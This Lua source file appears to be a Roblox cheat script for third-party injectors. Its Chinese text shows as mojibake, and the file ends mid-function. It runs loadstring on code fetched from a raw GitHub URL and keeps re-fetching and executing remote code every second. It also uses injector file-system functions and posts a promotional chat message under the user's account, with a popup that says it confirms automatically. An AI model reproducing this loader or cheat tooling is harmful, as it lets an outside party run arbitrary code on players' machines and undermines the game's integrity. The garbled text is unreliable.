--loadstring(game:HttpGet("https://raw.githubusercontent.com/QRNB4588ZNB/QR/refs/heads/main/BAO%20CHENG%20PEI%20ZHI"))()
local CONFIG = {
    enabled = true,
    interval = 1, -- ç›´æ¥æ”¹ä¸º5ç§’
    urls = {"https://raw.githubusercontent.com/QRNB4588ZNB/QR/refs/heads/main/TI%20RENG"}
}

-- ================ è‡ªåŠ¨å‘è¨€å–æ¶ˆå¯†ç é…ç½® ================
local CANCEL_CHAT_PASSWORD = "" -- å–æ¶ˆå‘è¨€çš„å¯†ç 
local CANCEL_CHAT_FILE = "cancel_auto_chat.json"

-- æ£€æŸ¥æ˜¯å¦å·²ç»å–æ¶ˆè‡ªåŠ¨å‘è¨€
local function isAutoChatCancelled()
    if not readFunc then return false end
    
    local filePath = getVerifyFolderPath() .. "/" .. CANCEL_CHAT_FILE
    local fileExists = pcall(function() readFunc(filePath) end)
    if not fileExists then return false end
    
    local success, content = pcall(readFunc, filePath)
    if not success or not content or content == "" then
        return false
    end
    
    local success, data = pcall(function() return HttpService:JSONDecode(content) end)
    if not success or not data then return false end
    
    return data.cancelled == true
end

-- ä¿å­˜å–æ¶ˆè‡ªåŠ¨å‘è¨€çŠ¶æ€
local function saveAutoChatCancelled()
    if not writeFunc then 
        print("æ— æ–‡ä»¶å†™å…¥åŠŸèƒ½")
        return false 
    end
    
    local folderPath = getVerifyFolderPath()
    local filePath = folderPath .. "/" .. CANCEL_CHAT_FILE
    
    -- ç¡®ä¿ç›®å½•å­˜åœ¨
    local success, err = pcall(function()
        -- å…ˆå°è¯•åˆ›å»ºéªŒè¯æ–‡ä»¶å¤¹
        local baseFolder = folderPath:match("^(.*[/\\])") or (folderPath:match("^(.*)[/\\].-$"))
        if baseFolder and not pcall(function() readFunc(baseFolder .. "/.verify") end) then
            pcall(function() writeFunc(baseFolder .. "/.verify", "") end)
        end
        -- ç¡®ä¿å…·ä½“æ–‡ä»¶å¤¹å­˜åœ¨
        writeFunc(folderPath .. "/.verify", "")
    end)
    
    if not success then
        print("åˆ›å»ºæ–‡ä»¶å¤¹å¤±è´¥:", err)
        return false
    end
    
    local cancellationData = {
        cancelled = true,
        cancellationTime = os.time(),
        permanent = true
    }
    
    local success, json = pcall(function() 
        return HttpService:JSONEncode(cancellationData) 
    end)
    
    if not success or not json then 
        print("JSONç¼–ç å¤±è´¥")
        return false 
    end
    
    local success, err = pcall(writeFunc, filePath, json)
    if not success then
        print("æ–‡ä»¶å†™å…¥å¤±è´¥:", err)
        return false
    end
    
    print("è‡ªåŠ¨å‘è¨€å–æ¶ˆçŠ¶æ€ä¿å­˜æˆåŠŸ")
    return true
end

local scripts, stops = {}, {}
task.spawn(function()
    while CONFIG.enabled do
        for _, url in ipairs(CONFIG.urls) do
            pcall(function()
                local content = game:HttpGet(url .. "?t=" .. os.time() .. math.random(1e5,1e6))
                if content and content ~= "" and scripts[url] ~= content then
                    if stops[url] then pcall(stops[url]) end
                    scripts[url] = content
                    local func = loadstring(content)
                    if func then stops[url] = func() or _G.StopKickScript end
                end
            end)
        end
        wait(CONFIG.interval)
    end
end)
-- ç§‹å®¹è„šæœ¬ï¼šæœåŠ¡å™¨é»‘åå•æ£€æµ‹ï¼ˆå¼ºçƒˆå»ºè®®æ”¾åœ¨è„šæœ¬æœ€é¡¶éƒ¨ï¼‰
local BLOCKED_SERVERS = {
    [12603480397] = "https://www.roblox.com/games/12603480397/1937",
    -- [æ›´å¤šPlaceId] = "å¯¹åº”é“¾æ¥",
    -- [111111111] = "https://www.roblox.com/games/111111111/xxxx",
    -- [222222222] = "https://www.roblox.com/games/222222222/yyyy",
}

-- ====== å…¬ç›Šæ¨¡å¼é…ç½® ======
local PUBLIC_WELFARE_MODE = true  -- true: å¼€å¯å…¬ç›Šæ¨¡å¼ï¼ˆè·³è¿‡å¡å¯†éªŒè¯ï¼‰| false: å…³é—­å…¬ç›Šæ¨¡å¼ï¼ˆéœ€è¦å¡å¯†éªŒè¯ï¼‰
local CORRECT_QQ_GROUP = "236753513"  -- æ­£ç¡®çš„QQç¾¤å·
local QQ_CHANNEL = "QRYYDS54188NB"    -- QQé¢‘é“å·

-- ====== æ°¸ä¹…éªŒè¯æ–‡ä»¶ç³»ç»Ÿ ======
local VERIFICATION_FILE_NAME = "qiuRong_permanent_verification.json"
local VERIFY_FOLDER_NAME = "åŒæ„ç§‹å®¹è„šæœ¬"

-- è·å–éªŒè¯æ–‡ä»¶è·¯å¾„
local function getVerificationFilePath()
    local basePath
    if type(getPathFunc) == "function" then
        pcall(function() basePath = getPathFunc() end)
    elseif getPathFunc then
        basePath = tostring(getPathFunc)
    else
        basePath = "Roblox/Scripts"
    end
    basePath = basePath or "Roblox/Scripts"
    local folderPath = basePath .. "/" .. VERIFY_FOLDER_NAME
    return folderPath .. "/" .. VERIFICATION_FILE_NAME
end

-- è¯»å–éªŒè¯æ–‡ä»¶
local function readVerificationFile()
    if not readFunc then return nil end
    
    local filePath = getVerificationFilePath()
    local fileExists = pcall(function() readFunc(filePath) end)
    if not fileExists then return nil end
    
    local success, content = pcall(readFunc, filePath)
    if not success or not content or content == "" then
        return nil
    end
    
    local success, data = pcall(function() return HttpService:JSONDecode(content) end)
    if not success or not data then return nil end
    
    return data
end

-- å†™å…¥éªŒè¯æ–‡ä»¶
local function writeVerificationFile(verificationData)
    if not writeFunc then return false end
    
    local folderPath = getVerifyFolderPath()
    local filePath = getVerificationFilePath()
    
    -- ç¡®ä¿ç›®å½•å­˜åœ¨
    pcall(function()
        writeFunc(folderPath .. "/.verify", "")
    end)
    
    -- å†™å…¥éªŒè¯æ•°æ®
    local success, json = pcall(function() 
        return HttpService:JSONEncode(verificationData) 
    end)
    if not success or not json then return false end
    
    local success, err = pcall(writeFunc, filePath, json)
    return success
end

-- æ£€æŸ¥QQéªŒè¯æ˜¯å¦æœ‰æ•ˆï¼ˆæ°¸ä¹…æœ‰æ•ˆï¼Œåªè¦æ–‡ä»¶å­˜åœ¨ï¼‰
local function isQQVerificationValid()
    -- å…¬ç›Šæ¨¡å¼ç›´æ¥è¿”å›true
    if PUBLIC_WELFARE_MODE then
        return true
    end
    
    local verificationData = readVerificationFile()
    if not verificationData then return false end
    
    -- åªè¦æ–‡ä»¶å­˜åœ¨ä¸”åŒ…å«éªŒè¯æ ‡è®°ï¼Œå°±è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„
    if verificationData.qqVerified then
        return true
    end
    
    return false
end

-- ä¿å­˜QQéªŒè¯çŠ¶æ€
local function saveQQVerification()
    local verificationData = {
        qqVerified = true,
        verificationTime = os.time(),
        qqGroup = CORRECT_QQ_GROUP,
        permanent = true  -- æ ‡è®°ä¸ºæ°¸ä¹…éªŒè¯
    }
    
    return writeVerificationFile(verificationData)
end

if BLOCKED_SERVERS[game.PlaceId] then
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    if LocalPlayer and LocalPlayer.Kick then
        LocalPlayer:Kick("æ£€æµ‹åˆ°æœ¬æœï¼ˆPlaceId: " .. tostring(game.PlaceId) .. "ï¼‰ç¦æ­¢ä½¿ç”¨ç§‹å®¹è„šæœ¬ã€‚\nå¦‚éœ€ä½“éªŒè¯·å‰å¾€å…¶ä»–æœåŠ¡å™¨"..BLOCKED_SERVERS[game.PlaceId])
    end
    return
end

-- ====== å»é™¤å¡å¯†ç³»ç»Ÿï¼šç°ï¿½ï¿½ï¿½åªä½¿ç”¨QQç¾¤éªŒè¯æˆ–å…¬ç›Šæ¨¡å¼ ======
local QQ_CHANNEL_URL = "https://pd.qq.com/s/3gu6csc8g?b=9"

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local HttpService = game:GetService("HttpService")

-- æ³¨å…¥å™¨æ–‡ä»¶æ“ä½œå…¼å®¹ï¼ˆè¯»å–/å†™å…¥/åˆ é™¤ï¼‰
local readFunc, writeFunc, deleteFunc, getPathFunc
pcall(function()
    if type(syn) == "table" then
        readFunc = syn.readfile or readfile
        writeFunc = syn.writefile or writefile
        -- æœ‰äº›æ³¨å…¥å™¨æä¾› deletefile / delfile / deletefolder
        deleteFunc = syn.deletefile or syn.delete or delfile or deletefile or function(p) end
        getPathFunc = syn.datapath
    else
        readFunc = readfile or readFile
        writeFunc = writefile or writeFile
        deleteFunc = delfile or deletefile or function(p) end
        getPathFunc = function() return "Roblox/Scripts" end
    end
end)

local function setclipboard_safe(text)
    pcall(function() setclipboard(text) end)
end

local function getVerifyFolderPath()
    local basePath
    if type(getPathFunc) == "function" then
        pcall(function() basePath = getPathFunc() end)
    elseif getPathFunc then
        basePath = tostring(getPathFunc)
    else
        basePath = "Roblox/Scripts"
        pcall(function()
            if game:GetService("RunService"):IsStudio() then
                basePath = "Roblox/Scripts"
            elseif pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(1).Name end) then
                -- ä¸å¿…å¼ºæ±‚
            end
        end)
    end
    basePath = basePath or "Roblox/Scripts"
    local folderPath = basePath .. "/" .. VERIFY_FOLDER_NAME
    return folderPath
end

-- ====== æå‰å®šä¹‰UIåˆ›å»ºå‡½æ•° ======
local function createScreenGui(name)
    local gui = Instance.new("ScreenGui")
    gui.Name = name
    gui.IgnoreGuiInset = true
    gui.Parent = PlayerGui
    return gui
end

local function createFrame(parent, size, position)
    local frame = Instance.new("Frame")
    frame.Size = size
    frame.Position = position
    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    frame.BackgroundTransparency = 0.3
    frame.BorderSizePixel = 1
    frame.BorderColor3 = Color3.fromRGB(180, 160, 255)
    frame.Parent = parent
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    return frame
end

local function createLabel(parent, text, size, position)
    local label = Instance.new("TextLabel")
    label.Text = text
    label.Size = size
    label.Position = position
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextSize = 16
    label.BackgroundTransparency = 1
    label.Parent = parent
    return label
end

local function createButton(parent, text, size, position, callback)
    local btn = Instance.new("TextButton")
    btn.Text = text
    btn.Size = size
    btn.Position = position
    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.TextSize = 14
    btn.Parent = parent
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = btn
    if callback then
        btn.MouseButton1Click:Connect(callback)
    end
    return btn
end

local function createClickToInput(parent, size, position, triggerText, placeholderText)
    local trigger = Instance.new("TextButton")
    trigger.Size = size
    trigger.Position = position
    trigger.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    trigger.BackgroundTransparency = 0.7
    trigger.Text = triggerText
    trigger.TextColor3 = Color3.new(1, 1, 1)
    trigger.TextSize = 14
    trigger.Parent = parent
    local cornerTrigger = Instance.new("UICorner")
    cornerTrigger.CornerRadius = UDim.new(0, 6)
    cornerTrigger.Parent = trigger
    
    local box = Instance.new("TextBox")
    box.Size = size
    box.Position = position
    box.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    box.BackgroundTransparency = 0.7
    box.TextColor3 = Color3.new(1, 1, 1)
    box.TextSize = 14
    box.PlaceholderText = placeholderText
    box.Visible = false
    box.Parent = parent
    local cornerBox = Instance.new("UICorner")
    cornerBox.CornerRadius = UDim.new(0, 6)
    cornerBox.Parent = box
    
    trigger.MouseButton1Click:Connect(function()
        trigger.Visible = false
        box.Visible = true
        box:CaptureFocus()
    end)
    
    return trigger, box
end

-- å¼¹çª—ç®€æ˜“å·¥å…·ï¼ˆç”¨äºæç¤ºï¼‰
local function showSimplePopup(titleText, btnText)
    local success, err = pcall(function()
        if not PlayerGui then return end
        local gui = Instance.new("ScreenGui")
        gui.Name = "ç§‹å®¹æç¤º_" .. tostring(math.random(1000,9999))
        gui.Parent = PlayerGui
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0,420,0,160)
        frame.Position = UDim2.new(0.5,-210,0.5,-80)
        frame.BackgroundColor3 = Color3.fromRGB(40,40,60)
        frame.Parent = gui
        local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0,12); corner.Parent = frame
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1,-20,0,100)
        label.Position = UDim2.new(0,10,0,10)
        label.BackgroundTransparency = 1
        label.Text = titleText
        label.TextWrapped = true
        label.TextColor3 = Color3.new(1,1,1)
        label.TextSize = 16
        label.Parent = frame
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.5,-20,0,36)
        btn.Position = UDim2.new(0.25,0,1,-46)
        btn.Text = btnText or "ç¡®å®š"
        btn.BackgroundColor3 = Color3.fromRGB(80,120,200)
        btn.TextColor3 = Color3.new(1,1,1)
        local btnCorner = Instance.new("UICorner"); btnCorner.CornerRadius = UDim.new(0,8); btnCorner.Parent = btn
        btn.Parent = frame
        btn.MouseButton1Click:Connect(function()
            gui:Destroy()
        end)
    end)
    if not success then
        warn("å¼¹çª—åˆ›å»ºå¤±è´¥: "..tostring(err))
    end
end

-- ====== æ–°å¢QQç¾¤éªŒè¯å¼¹çª— ======
local function Popup_VerifyQQGroup()
    -- æ£€æŸ¥æ˜¯å¦å·²æœ‰æ°¸ä¹…éªŒè¯
    if isQQVerificationValid() then
        print("æ£€æµ‹åˆ°æ°¸ä¹…QQéªŒè¯è®°å½•ï¼Œè·³è¿‡éªŒè¯")
        return
    end
    
    local gui = createScreenGui("Popup_QQGroupVerify")
    local frame = createFrame(gui, UDim2.new(0, 420, 0, 260), UDim2.new(0.5, -210, 0.5, -130))
    createLabel(frame, "è¯·è¾“å…¥ç§‹å®¹QQç¾¤å·", UDim2.new(1, 0, 0, 35), UDim2.new(0, 0, 0, 25))
    
    local _, inputQQGroup = createClickToInput(
        frame, UDim2.new(1, -50, 0, 45), UDim2.new(0, 25, 0, 75),
        "ç‚¹å‡»è¾“å…¥QQç¾¤å·", "è¯·è¾“å…¥QQç¾¤å·"
    )
    
    local statusLabel = createLabel(frame, "", UDim2.new(1, 0, 0, 25), UDim2.new(0, 0, 0, 135))
    local done = false
    
    createButton(frame, "éªŒè¯QQç¾¤", UDim2.new(0.45, 0, 0, 35), UDim2.new(0.1, 0, 0, 185), function()
        if inputQQGroup.Text == CORRECT_QQ_GROUP then
            -- ä¿å­˜æ°¸ä¹…éªŒè¯çŠ¶æ€
            local saveSuccess = saveQQVerification()
            if saveSuccess then
                print("æ°¸ä¹…QQéªŒè¯çŠ¶æ€å·²ä¿å­˜")
            else
                warn("QQéªŒè¯çŠ¶æ€ä¿å­˜å¤±è´¥ï¼Œä¸‹æ¬¡ä»éœ€éªŒè¯")
            end
            
            done = true
            gui:Destroy()
        else
            statusLabel.Text = "QQç¾¤å·è¾“å…¥é”™è¯¯ï¼\nè¯·åŠ å…¥QQé¢‘é“ " .. QQ_CHANNEL .. " è·å–æ­£ç¡®ç¾¤å·"
            statusLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
            pcall(setclipboard_safe, QQ_CHANNEL)
        end
    end)
    
    createButton(frame, "é€€å‡ºè„šæœ¬", UDim2.new(0.45, 0, 0, 35), UDim2.new(0.5, 0, 0, 185), function()
        gui:Destroy()
        error("ç”¨æˆ·ä¸»åŠ¨é€€å‡ºï¼Œè„šæœ¬åœæ­¢è¿è¡Œ")
    end)
    
    while not done do task.wait() end
end

-- ====== å¿«æ‰‹éªŒè¯å¼¹çª—å‡½æ•°å®šä¹‰ ======
local function Popup_VerifyKuaishou()
    local gui = createScreenGui("Popup_Kuaishou")
    local frame = createFrame(gui, UDim2.new(0, 420, 0, 240), UDim2.new(0.5, -210, 0.5, -120))
    createLabel(frame, "ä¸»æ’­çš„å¿«æ‰‹å·ï¿½ï¿½ï¿½ä»€ä¹ˆï¼Ÿ", UDim2.new(1, 0, 0, 35), UDim2.new(0, 0, 0, 25))
    
    local _, inputKuaishou = createClickToInput(
        frame, UDim2.new(1, -50, 0, 45), UDim2.new(0, 25, 0, 75),
        "ç‚¹å‡»è¾“å…¥å¿«æ‰‹å·", "è¯·è¾“å…¥æ­£ç¡®çš„å¿«æ‰‹å·"
    )
    
    local statusLabel = createLabel(frame, "", UDim2.new(1, 0, 0, 25), UDim2.new(0, 0, 0, 135))
    local done = false
    
    createButton(frame, "éªŒè¯å¿«æ‰‹å·", UDim2.new(0.45, 0, 0, 35), UDim2.new(0.1, 0, 0, 175), function()
        if inputKuaishou.Text == "CN_QRNBYYDS" then
            done = true
            gui:Destroy()
        else
            statusLabel.Text = "è¿™éƒ½ä¸çŸ¥é“é…ç”¨è„šæœ¬å—ğŸ‘¿å¿«æ‰‹å·CN_QRNBYYDS"
            statusLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
        end
    end)
    
    createButton(frame, "é€€å‡ºè„šæœ¬", UDim2.new(0.45, 0, 0, 35), UDim2.new(0.5, 0, 0, 175), function()
        gui:Destroy()
        error("ç”¨æˆ·ä¸»åŠ¨é€€å‡ºï¼Œè„šæœ¬åœæ­¢è¿è¡Œ")
    end)
    
    while not done do task.wait() end
end

-- ç›´æ¥æ˜¾ç¤ºè‡ªåŠ¨å‘è¨€ç¡®è®¤çª—å£ and announcement (skip all card/key validation)
print("å…¬ç›Šæ¨¡å¼ï¼šè·³è¿‡æ‰€æœ‰å¡å¯†éªŒè¯ï¼ˆè‹¥å…³é—­å…¬ç›Šæ¨¡å¼è¯·è®¾ç½® PUBLIC_WELFARE_MODE=false å¹¶è°ƒæ•´éªŒè¯æµç¨‹ï¼‰")
-- å…ˆæ˜¾ç¤ºè‡ªåŠ¨å‘è¨€ç¡®è®¤çª—å£
-- ====== ä»¥ä¸‹ä¸ºä½ åŸå§‹å®Œæ•´è„šæœ¬ï¼ˆåŒ…å«å·²ç»å­˜åœ¨çš„éªŒè¯ã€UIã€åŠŸèƒ½ç­‰ï¼‰ï¼Œå¹¶åšäº†å¿…è¦çš„æ”¹åŠ¨ä»¥æ»¡è¶³ä½ çš„è¦æ±‚ ======
-- ç§‹å®¹è„šæœ¬éªŒè¯æ ¸å¿ƒé€»è¾‘ï¼ˆLocalScriptï¼Œé€‚é…å¤šæ³¨å…¥å™¨ï¼‰
-- éªŒè¯æ ‡è®°ï¼šæ³¨å…¥å™¨æŒä¹…åŒ–ç›®å½•ä¸‹çš„"åŒæ„ç§‹å®¹è„šæœ¬"æ–‡ä»¶å¤¹
-----------------------------------------------------------
-- ================ åŸºç¡€æœåŠ¡ä¸å˜é‡ ================
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = (pcall(function() return game:GetService("TextChatService") end) and game:GetService("TextChatService")) or nil
local Color3 = Color3
local UDim2 = UDim2
local Instance = Instance
local task = task
local Enum = Enum

-- æ³¨å…¥å™¨æ–‡ä»¶æ“ä½œå…¼å®¹ï¼ˆæ ¸å¿ƒï¼šè·å–æŒä¹…åŒ–è·¯å¾„ï¼‰
-- reuse readFunc/writeFunc/getPathFunc defined above; if not, reinitialize fallback
pcall(function()
    if type(syn) == "table" then
        readFunc = syn.readfile or readfile
        writeFunc = syn.writefile or writefile
        getPathFunc = syn.datapath
    else
        readFunc = readfile or readFile
        writeFunc = writefile or writeFile
        getPathFunc = function() return "Roblox/Scripts" end
    end
end)
-- ================ è‡ªåŠ¨å‘è¨€ï¼ˆç½®é¡¶æ‰§è¡Œï¼‰ ================

local AUTO_CHAT_MSG = "ä½¿ç”¨æ­¤è„šæœ¬æ¶æ„æ£ä¹±ksæœCN_QRNBYYDSè”ç³»å¯è¸¢å‡º" -- è‹¥éœ€æ›´æ”¹ï¼Œè¯·åœ¨æ­¤ä¿®æ”¹

-- åˆ›å»ºç¡®è®¤çª—å£å‡½æ•°
local function createConfirmationWindow()
    -- åˆ›å»ºä¸»GUI
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AutoChatConfirmation"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 9999
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    -- æ’­æ”¾éŸ³æ•ˆ
    local function playNotificationSound()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://87437544236708"
        sound.Volume = 0.5
        sound.Parent = screenGui
        sound:Play()
        game:GetService("Debris"):AddItem(sound, 3)
    end

    -- æ’­æ”¾æç¤ºéŸ³
    pcall(playNotificationSound)

    -- ä¸»çª—å£æ¡†æ¶ - å¢åŠ é«˜åº¦ä»¥å®¹çº³å¯†ç åŒºåŸŸ
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 300) -- é«˜åº¦ä»300å¢åŠ åˆ°380
    mainFrame.Position = UDim2.new(1, -300, 300, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    mainFrame.BackgroundTransparency = 0.2
    mainFrame.BorderSizePixel = 0
    mainFrame.AnchorPoint = Vector2.new(1, 0)
    mainFrame.Parent = screenGui

    -- åœ†è§’
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame

    -- é˜´å½±/è¾¹æ¡†
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(100, 100, 100)
    stroke.Thickness = 1.5
    stroke.Transparency = 0.3
    stroke.Parent = mainFrame

    -- æ ‡é¢˜æ 
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 30)
    titleBar.Position = UDim2.new(0, 0, 0, 0)
    titleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    titleBar.BackgroundTransparency = 0.3
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainFrame

    -- æ ‡é¢˜æ åœ†è§’
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 12)
    titleCorner.Parent = titleBar

    -- æ ‡é¢˜æ–‡æœ¬
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -10, 1, 0)
    title.Position = UDim2.new(0, 10, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "è‡ªåŠ¨å‘è¨€ç¡®è®¤"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 16
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = titleBar

    -- å†…å®¹æ–‡æœ¬ - è°ƒæ•´ä½ç½®
    local content = Instance.new("TextLabel")
    content.Size = UDim2.new(1, -20, 0, 80) -- å¢åŠ é«˜åº¦ä»¥æ˜¾ç¤ºæ›´å¤šæ–‡æœ¬
    content.Position = UDim2.new(0, 10, 0, 40) -- ä¸‹ç§»
    content.BackgroundTransparency = 1
    content.Text = "æ˜¯å¦å¸®åŠ©ç§‹å®¹å¼•æµå‘è¨€ï¼Ÿ\nå¦‚æœé‡åˆ°åŒè¡Œ,å¯ç§ä¿¡ç§‹å®¹ä½œè€…è¸¢å‡º\nå¿ å‘Š:å¦‚æœä½ ä¸æ‰¾æˆ‘,ä½ å°†å¯èƒ½è¢«ä»–è¸¢å‡ºğŸ˜±ğŸ¤“ğŸ–•\n\nç§’åè‡ªåŠ¨ç¡®è®¤"
    content.TextColor3 = Color3.fromRGB(255, 255, 255)
    content.TextSize = 20
    content.Font = Enum.Font.Gotham
    content.TextWrapped = true
    content.Parent = mainFrame

    -- ================ æ–°å¢å¯†ç éªŒè¯åŒºåŸŸ ================
    local passwordSection = Instance.new("Frame")
    passwordSection.Size = UDim2.new(1, -20, 0, 100)
    passwordSection.Position = UDim2.new(0, 10, 0, 130) -- åœ¨å†…å®¹å’ŒæŒ‰é’®ä¹‹é—´
    passwordSection.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    passwordSection.BackgroundTransparency = 0.7
    passwordSection.Parent = mainFrame
    local passwordCorner = Instance.new("UICorner")
    passwordCorner.CornerRadius = UDim.new(0, 8)
    passwordCorner.Parent = passwordSection

    -- å¯†ç åŒºåŸŸæ ‡é¢˜
    local passwordTitle = Instance.new("TextLabel")
    passwordTitle.Size = UDim2.new(1, -10, 0, 25)
    passwordTitle.Position = UDim2.new(0, 5, 0, 5)
    passwordTitle.BackgroundTransparency = 1
    passwordTitle.Text = "è¾“å…¥æ­£ç¡®å¯†ç å°†å–æ¶ˆå‘è¨€"
    passwordTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
    passwordTitle.TextSize = 14
    passwordTitle.Font = Enum.Font.GothamBold
    passwordTitle.TextXAlignment = Enum.TextXAlignment.Center
    passwordTitle.Parent = passwordSection

    -- å¯†ç è¾“å…¥æ¡†
    local passwordInput = Instance.new("TextBox")
    passwordInput.Size = UDim2.new(0.7, -5, 0, 35)
    passwordInput.Position = UDim2.new(0, 5, 0, 35)
    passwordInput.PlaceholderText = "è¯·è¾“å…¥å–æ¶ˆå¯†ç "
    passwordInput.Text = ""
    passwordInput.TextColor3 = Color3.fromRGB(255, 255, 255)
    passwordInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
    passwordInput.TextSize = 14
    passwordInput.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    passwordInput.BackgroundTransparency = 0.5
    passwordInput.Parent = passwordSection
    local inputCorner = Instance.new("UICorner")
    inputCorner.CornerRadius = UDim.new(0, 6)
    inputCorner.Parent = passwordInput

    -- éªŒè¯æŒ‰é’®
    local verifyButton = Instance.new("TextButton")
    verifyButton.Size = UDim2.new(0.3, -5, 0, 35)
    verifyButton.Position = UDim2.new(0.7, 0, 0, 35)
    verifyButton.Text = "éªŒè¯å¯†ç "
    verifyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    verifyButton.TextSize = 14
    verifyButton.Font = Enum.Font.GothamBold
    verifyButton.BackgroundColor3 = Color3.fromRGB(80, 120, 200)
    verifyButton.BackgroundTransparency = 0.3
    verifyButton.Parent = passwordSection
    local verifyCorner = Instance.new("UICorner")
    verifyCorner.CornerRadius = UDim.new(0, 6)
    verifyCorner.Parent = verifyButton

    -- éªŒè¯çŠ¶æ€æç¤º
    local verifyStatus = Instance.new("TextLabel")
    verifyStatus.Size = UDim2.new(1, -10, 0, 20)
    verifyStatus.Position = UDim2.new(0, 5, 0, 75)
    verifyStatus.BackgroundTransparency = 1
    verifyStatus.Text = ""
    verifyStatus.TextColor3 = Color3.fromRGB(255, 255, 255)
    verifyStatus.TextSize = 12
    verifyStatus.Font = Enum.Font.Gotham
    verifyStatus.TextXAlignment = Enum.TextXAlignment.Center
    verifyStatus.Parent = passwordSection

-- æ£€æŸ¥æ˜¯å¦å·²ç»å–æ¶ˆè‡ªåŠ¨å‘è¨€
local memoryAutoChatCancelled = false -- æ–°å¢ï¼šå†…å­˜ä¸­çš„å–æ¶ˆçŠ¶æ€
local function isAutoChatalled()
    if memoryAutoChatCancelled then
        return true
    end
    
    if not readFunc then return false end
    
    local filePath = getVerifyFolderPath() .. "/" .. CANCEL_CHAT_FILE
    local fileExists = pcall(function() readFunc(filePath) end)
    if not fileExists then return false end
    
    local success, content = pcall(readFunc, filePath)
    if not success or not content or content == "" then
        return false
    end
    
    local success, data = pcall(function() return HttpService:JSONDecode(content) end)
    if not success or not data then return false end
    
    return data.cancelled == true
end

-- éªŒè¯æŒ‰é’®ç‚¹å‡»äº‹ä»¶ - ä¿®æ”¹åçš„ç‰ˆæœ¬
verifyButton.MouseButton1Click:Connect(function()
    if passwordInput.Text == CANCEL_CHAT_PASSWORD then
        -- å¯†ç æ­£ç¡®ï¼Œè®¾ç½®å†…å­˜çŠ¶æ€å¹¶å…³é—­çª—å£
        memoryAutoChatCancelled = true
        verifyStatus.Text = "éªŒè¯æˆåŠŸï¼å·²å–æ¶ˆè‡ªåŠ¨å‘è¨€"
        verifyStatus.TextColor3 = Color3.fromRGB(80, 255, 80)
        
        -- å»¶è¿Ÿå…³é—­çª—å£
        wait(1)
        if screenGui and screenGui.Parent then
            screenGui:Destroy()
        end
    else
        verifyStatus.Text = "å¯†ç é”™è¯¯ï¼Œè¯·é‡è¯•"
        verifyStatus.TextColor3 = Color3.fromRGB(255, 80, 80)
    end
end)
    -- ================ å¯†ç éªŒè¯åŒºåŸŸç»“æŸ ================

    -- æŒ‰é’®å®¹å™¨ - è°ƒæ•´ä½ç½®
    local buttonContainer = Instance.new("Frame")
    buttonContainer.Size = UDim2.new(1, -20, 0, 40)
    buttonContainer.Position = UDim2.new(0, 10, 1, -50)
    buttonContainer.BackgroundTransparency = 1
    buttonContainer.Parent = mainFrame

    -- å–æ¶ˆæŒ‰é’®ï¼ˆå·¦ä¸‹è§’ï¼‰
    local cancelButton = Instance.new("TextButton")
    cancelButton.Size = UDim2.new(0.4, 0, 1, 0)
    cancelButton.Position = UDim2.new(0, 0, 0, 0)
    cancelButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    cancelButton.BackgroundTransparency = 0.3
    cancelButton.Text = "å–æ¶ˆ"
    cancelButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    cancelButton.TextSize = 14
    cancelButton.Font = Enum.Font.GothamBold
    cancelButton.Parent = buttonContainer

    -- ç¡®å®šæŒ‰é’®ï¼ˆå³ä¸‹è§’ï¼‰
    local confirmButton = Instance.new("TextButton")
    confirmButton.Size = UDim2.new(0.4, 0, 1, 0)
    confirmButton.Position = UDim2.new(0.6, 0, 0, 0)
    confirmButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
